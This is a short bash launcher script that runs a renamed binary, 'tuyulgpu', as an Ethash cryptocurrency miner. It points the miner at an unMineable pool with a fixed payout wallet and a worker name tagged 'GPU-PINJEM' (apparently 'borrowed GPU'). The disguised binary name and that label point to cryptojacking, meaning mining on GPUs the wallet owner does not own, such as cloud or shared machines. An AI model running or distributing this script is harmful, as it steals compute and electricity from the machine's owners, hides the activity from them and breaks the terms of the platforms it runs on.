#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=WIN:THyaVTKqcVu3f5UfYoG21cbYF8ir1jNKPm
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
